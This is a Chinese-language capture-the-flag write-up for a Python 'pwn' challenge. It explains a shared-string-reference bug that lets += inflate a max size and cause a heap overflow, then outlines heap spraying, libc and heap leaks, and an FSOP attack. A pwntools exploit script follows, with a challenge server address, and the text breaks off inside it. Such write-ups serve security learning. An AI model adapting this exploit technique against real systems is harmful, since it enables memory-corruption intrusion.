mstr python pwn 漏洞和python内部的机制有关系，python对象并不直接存储对象，而是存储对象的引用。而mutableString类的data是string，max_size_str也是string。这就会导致data和max_size_str指向同一个字符对象。 至此还不会产生漏洞，因为如果对data进行修改，python会创建新的对象并修改引用指针。但是此时类里面提供了一个方法可以直接修改字符数组+=。如果我们对一个size进行+=就会导致max_size超级大，从而产生一个堆溢出。 然后观察堆上的情况，会发现对正常的对象进行溢出会破坏结构指针导致crush。而python堆结尾的内容则为全空，覆盖也不会产生影响。因此可以考虑堆喷将对象喷到堆末尾，然后再申请新的对象，从而构造出堆重叠。（+=方法会修改string对象的长度） 接着通过modify就可以修改下一个字符对象的长度，再从堆上泄漏出libcbase和heapbase，接下来用任意写打FSOP即可 from pwn import * filename = &#x27;./python&#x27; libc = ELF("./libc.so.6") host= &#x27;1.95.190.154&#x27; port= 26000 # host = &#x27;127.0.0.1&#x27; # port = 9999 sla = lambda x,s : p.sendlineafter(x,s) sl = lambda s : p.sendline(s) sa = lambda x,s : p.sendafter(x,s) s = lambda s : p.send(s) e = ELF(filename) context.log_level=&#x27;debug&#x27; context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os) def run(mode, script = ""): if "d" in mode: p = gdb.debug(filename, script) elif "l" in mode: p = process([filename, &#x27;./mstr.py&#x27;]) elif "r" in mode: p = remote(host, port) elif "a" in mode: p = process([filename, &#x27;./mstr.py&#x27;]) gdb.attach(p, script) return p def getp(): global script if len(sys.argv) == 2: p = run(sys.argv[1], script) else: p = run("l", script) return p def new(content): payload = b&#x27;new &#x27; + content sla(&#x27;>&#x27;, payload) def set_max(idx, size): payload = b&#x27;set_max &#x27; + str(size).encode() + b&#x27; &#x27; + str(idx).encode() sla(&#x27;>&#x27;,payload) def plus_eq(idx1, idx2): payload = b&#x27;+= &#x27; + str(idx1).encode() + b&#x27; &#x27; + str(idx2).encode() sla(&#x27;>&#x27;, payload) def plus(idx1, idx2): payload = b&#x27;+ &#x27; + str(idx1).encode() + b&#x27; &#x27; + str(idx2).encode() sla(&#x27;>&#x27;, payload) def print_max(idx): payload = b&#x27;print_max &#x27;+ str(idx).encode() sla(&#x27;>&#x27;, payload) def print_c(idx): payload = b&#x27;print &#x27;+ str(idx).encode() sla(&#x27;>&#x27;, payload) def modify(idx, offset, val): payload = b&#x27;modify &#x27